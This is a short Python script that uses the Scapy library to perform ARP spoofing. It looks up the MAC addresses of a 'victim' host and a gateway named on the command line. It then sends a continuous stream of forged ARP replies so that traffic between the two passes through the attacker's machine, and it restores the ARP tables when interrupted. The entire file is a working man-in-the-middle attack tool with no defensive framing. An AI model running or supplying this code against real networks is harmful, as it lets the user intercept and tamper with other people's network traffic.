from scapy.all import *
from scapy.layers.l2 import Ether, ARP


def get_mac(victim_ip):
    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") \
                 / ARP(op=1, pdst=victim_ip)  # ask everyone whi is victim_ip and getting his mac
    victim_mac = srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    return victim_mac


# pdst - ip of destination
# psrc - ip of source
# hwdst - mac of destination
# hwsrc - mac of source

def spoof_arp_cache(victim_ip, victim_mac, source_ip):
    spoofed = ARP(op=2, pdst=victim_ip, psrc=source_ip, hwdst=victim_mac)
    send(spoofed, verbose=False)


def restore_arp(victim_ip, victim_mac, source_ip, source_mac):
    pack = ARP(op=2, hwsrc=source_mac, psrc=source_ip, hwdst=victim_mac, pdst=victim_ip)
    send(pack, verbose=False)
    print("ARP Table restored to normal for ", victim_ip)


def main():
    victimIP = sys.argv[1]
    gatewayIP = sys.argv[2]
    victimMac = ""
    gatewayMac = ""

    try:
        victimMac = get_mac(victimIP)
        print("Victim MAC: ", victimMac)
    except Exception as e:
        print("Victim machine did not respond to ARP broadcast :(")
        print(e)
        quit()

    try:
        gatewayMac = get_mac(gatewayIP)
        print("Gateway MAC: ", gatewayMac)
    except Exception as e:
        print("Gateway is unreachable")
        print(e)
        quit()

    try:
        print("Sending spoofed ARP responses")
        while True:  # direct traffic throw us before Control + C
            spoof_arp_cache(victimIP, victimMac, gatewayIP)
            spoof_arp_cache(gatewayIP, gatewayMac, victimIP)
    except KeyboardInterrupt as e:
        print("ARP spoofing stopped")
        print(e)
        restore_arp(gatewayIP, gatewayMac, victimIP, victimMac)
        restore_arp(victimIP, victimMac, gatewayIP, gatewayMac)
        quit()


if __name__ == "__main__":
    main()
